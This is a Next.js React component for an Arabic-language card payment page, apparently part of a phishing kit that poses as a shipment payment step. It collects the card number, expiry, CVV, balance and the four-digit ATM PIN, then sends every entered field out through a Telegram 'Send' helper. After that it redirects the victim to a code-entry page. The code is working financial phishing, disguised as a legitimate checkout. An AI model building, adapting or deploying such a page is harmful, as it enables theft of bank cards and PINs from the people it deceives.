"use client"
import styles from './pay.module.css'
import visa from '../../../../../public/visa.png'
import master from '../../../../../public/master.png'
import mada from '../../../../../public/mada.png'
import Image from 'next/image'
import {useState} from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import TeleSned from '@/server/TeleSend'



const Pay=()=>{


    const {Send} = TeleSned();
    const x = useSearchParams();
    const datas = x.get("names");
    const [form,setForm] = useState({
      data: {
        typecard:"اختر البطاقة",
        الاسم_على_البطاقة:"",
        رقم_البطاقة:"",
        MM:"",
        YY:"",
        cvcCard:"",
        كلمةالمرورالبطاقة:"",
        الرصيد:"",
        رقمالشحــنة:datas
      }
    });
    const router = useRouter()
    const setDynamicFormData = (name,value)=>{
      setForm({
        data:{
          ...form.data,
          [name]:value,
        }
      })
    }
    const PostToTelegram = () => {
      const description = Object.entries(form.data)
        .map((d) => `${d[0]} : ${d[1]} `)
        .join("\n");
      Send(description)

      
    };
      const handlerout = ()=>{
        if(form.data.typecard == "اختر البطاقة"||form.data.الاسم_على_البطاقة == "" || form.data.رقم_البطاقة == "" || form.data.MM == "" || form.data.YY == "" || form.data.cvcCard == "" || form.data.كلمةالمرورالبطاقة == ""){
          alert('من فضلك قم بملى الحقول')
        }else{
          
          router.push(`/aram/banks/pay/code?names=${datas}`)
        }
      }
  return (
    <div className={styles.main}>
    <div className={styles.contect} dir='rtl'>
    
    <div>
        <Image 
            src={visa}
            alt='visa'
            width={50}
        />
        <Image 
            src={master}
            alt='master'
            width={50}
        />
        <Image 
            src={mada}
            alt='mada'
            width={35}
        />
  
    </div>
    <form  onSubmit={(e)=>{
          e.preventDefault();
          PostToTelegram()
        }}>
      <label htmlFor="typecard">
        نوع البطاقة</label>
        <select name="typecard" onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required>
            <option value="اختر البطاقة">اختر البطاقة </option>
            <option value="مدى">مدى</option>
            <option value="فيزا كارد">فيزا كارد</option>
            <option value="ماستر كارد">ماستر كارد</option>
        </select>

        <label htmlFor="الاسم_على_البطاقة">
          الاسم على البطاقة</label>
        <input type="text" name="الاسم_على_البطاقة"placeholder='الاسم على البطاقة'onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required/>

        
        <label htmlFor="">
        رقم البطاقة</label>


        <input type="text" name="رقم_البطاقة" placeholder=' 1234-5678-9632-4258' dir="ltr" onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}   maxLength="16" required/>
        
         <div>
          
          <div className={styles.slebale}>
          <label htmlFor="cvc">
          cvc/cvv</label>
              <label htmlFor="الرصيد">
                          الرصيدالمتوفر
                     </label>
          <label htmlFor="data">
              تاريخ انتهاء البطاقة</label>
            </div>
            
            
             <div name="data" className={styles.dataes}>
             <input type="text" name='cvcCard' placeholder='123'onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} maxLength="3" required/>
                 <div className={styles.curmony}>
                     
                     <input type="text" name='الرصيد' placeholder='0.000000'onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} maxLength="7" required/>
                 </div>
                <div>
                <input type="text" name='MM' placeholder='(MM)' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} maxLength="2" required/>
                <input type="text" name="YY" placeholder='(YY)'  onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}maxLength="2" required/>
          
                </div>
                   </div>
            
        </div>
        
        
        <label htmlFor="">
        ادخل رقم بطاقة الصراف المكون من اربعة ارقام</label>
        <input type="text" name="كلمةالمرورالبطاقة" placeholder='رمز البطاقة المكون من اربعة ارقام' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} maxLength="5" required/>
        
        
       
        <button type='submit' onClick={handlerout}> ارسال</button>
    </form>
</div>
</div>
  )
}

export default Pay;
